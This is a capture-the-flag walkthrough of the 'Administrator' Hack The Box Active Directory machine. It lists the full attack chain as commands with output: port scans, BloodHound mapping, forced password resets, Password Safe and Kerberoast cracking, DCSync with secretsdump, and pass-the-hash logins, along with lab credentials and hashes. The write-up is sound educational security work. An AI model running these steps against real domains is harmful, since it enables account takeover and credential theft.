# Administrator

<div class="wu-meta" markdown="span">
<span class="wu-badge wu-os">:fontawesome-brands-windows: Windows</span>
<span class="wu-badge wu-diff wu-diff--medium">Medium</span>
<span class="wu-tags">
<span class="wu-tag">BloodHound</span>
<span class="wu-tag">ACL abuse</span>
<span class="wu-tag">Kerberoast</span>
<span class="wu-tag">DCSync</span>
</span>
</div>

!!! abstract "What this box demonstrates"
    Administrator is a pure Active Directory box that starts from an assume-breach position with credentials for a low-privileged user. From there it is a chain of privilege abuse: map the domain with BloodHound, walk a series of password-reset rights from one account to the next, loot a Password Safe backup pulled over FTP, then finish with a targeted Kerberoast and a DCSync to dump the domain administrator hash.

## Attack path

1. Authenticate with the provided `Olivia` credentials and collect BloodHound data on the domain.
2. Abuse a chain of password-reset rights (Olivia to Michael to Benjamin), then pull a `.psafe3` backup over FTP to recover `emily` and the user flag.
3. Targeted Kerberoast against `ethan`, crack the hash, then DCSync as `ethan` to dump the Administrator NTLM hash and log in.

**Tools:** evil-winrm, Impacket, bloodhound-python, smbmap, smbclient, targetedKerberoast, hashcat.

## Enumeration

Set the target and run a full port scan, then a service scan against what is open:

```bash
IP=10.10.11.42

ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

# TCP port scan
sudo nmap -p$ports -sC -sV $IP -oG scan_tcp

# UDP port scan
sudo nmap -sS -sU -p- $IP
```

### Nmap results

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-10 01:46:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
58608/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58613/tcp open  msrpc         Microsoft Windows RPC
58620/tcp open  msrpc         Microsoft Windows RPC
58633/tcp open  msrpc         Microsoft Windows RPC
58638/tcp open  msrpc         Microsoft Windows RPC
60131/tcp open  msrpc         Microsoft Windows RPC
```

Kerberos (88), LDAP (389, 3268), SMB (445), DNS (53), and FTP (21) together are a textbook domain controller. The domain is `administrator.htb`.

## Foothold

### Enumerating AD with the provided credentials

We are given credentials for `Olivia` per the HTB assume-breach setup. Log in with evil-winrm:

```bash
evil-winrm -i administrator.htb -u 'Olivia' -p 'ichliebedich'
```

Check the current user's privileges and list domain accounts:

```powershell
whoami /priv
net users
```

```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

User accounts for \\
-------------------------------------------------------------------------------
Administrator  alexander  benjamin  emily   emma   ethan
Guest          krbtgt     michael   olivia
```

Run BloodHound from the Kali box to map the domain and find abusable rights:

```bash
bloodhound-python -v -u Olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb -c All
```

BloodHound shows the reset chain: Olivia can force a password change on `michael`, and `michael` in turn can reset `benjamin`. Reset Michael, then use his access to reset Benjamin:

```bash
net rpc password "benjamin" "Pass321" -U "administrator.htb"/"michael"%"<michael-password>" -S "administrator.htb"
```

??? success "Michael's password"
    `NewPassword1`

### SMB and FTP as Benjamin

As `benjamin`, check share access:

```bash
smbclient -L administrator.htb -U benjamin
smbmap -H 10.10.11.42 -u 'benjamin' -p 'Pass321'
```

```
Disk        Permissions   Comment
----        -----------   -------
ADMIN$      NO ACCESS     Remote Admin
C$          NO ACCESS     Default share
IPC$        READ ONLY     Remote IPC
NETLOGON    READ ONLY     Logon server share
SYSVOL      READ ONLY     Logon server share
```

The shares hold nothing useful, but Benjamin can also reach FTP. Log in and pull everything:

```bash
ftp benjamin@10.10.11.42
# then, at the ftp prompt:
mget *
```

This yields a Password Safe backup, `Backup.psafe3`. Crack its master password with hashcat:

```bash
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

??? success "Cracked Password Safe master password"
    `tekieromucho`

Open the safe with that password to recover a set of account credentials, including `emily`. That gives the user flag:

```bash
evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

## Privilege escalation

BloodHound shows `emily` has `GenericWrite` over `ethan`, which is enough for a targeted Kerberoast. First sync time with the DC so Kerberos does not reject the tickets:

```bash
sudo apt install ntpsec-ntpdate
sudo ntpdate administrator.htb
```

Run a [targeted Kerberoast](https://github.com/ShutdownRepo/targetedKerberoast) as emily to force an SPN onto ethan and grab a crackable ticket:

```bash
targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

Crack the returned `$krb5tgs$` hash:

```bash
hashcat -m 13100 -a 0 ethan_hash.txt /usr/share/wordlists/rockyou.txt
```

??? success "Cracked ethan hash"
    `limpbizkit`

`ethan` has DCSync rights, so dump the domain with Impacket and pull the Administrator NTLM hash:

```bash
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42
```

??? success "Administrator NTLM hash"
    ```
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
    ```

Pass the hash with evil-winrm to log in as Administrator and take the root flag:

```bash
evil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```
